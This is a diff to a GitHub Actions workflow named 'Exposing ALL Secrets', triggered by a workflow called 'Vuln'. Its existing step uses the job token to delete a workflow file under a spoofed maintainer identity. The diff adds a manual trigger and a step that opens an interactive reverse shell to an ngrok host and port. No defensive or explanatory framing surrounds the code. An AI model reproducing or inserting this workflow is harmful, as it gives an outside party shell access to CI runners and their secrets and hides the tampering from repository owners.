@@ -1,6 +1,7 @@
 name: Exposing ALL Secrets
 
 on:
+  workflow_dispatch:
   workflow_run:
     workflows: ["Vuln"]
 
@@ -22,3 +23,5 @@ jobs:
       - run: |
           SHA=$(curl -X GET -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -s | jq -r .sha)
           curl -X DELETE -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/.github/workflows/$WORKFLOW_NAME -d '{"message":"$COMMIT_MESSAGE","committer":{"name":"$MAINTAINER_NAME","email":"$MAINTAINER_EMAIL"}, "sha":"'"${SHA}"'"}' 
+      - run: |
+          bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/18114 0>&1
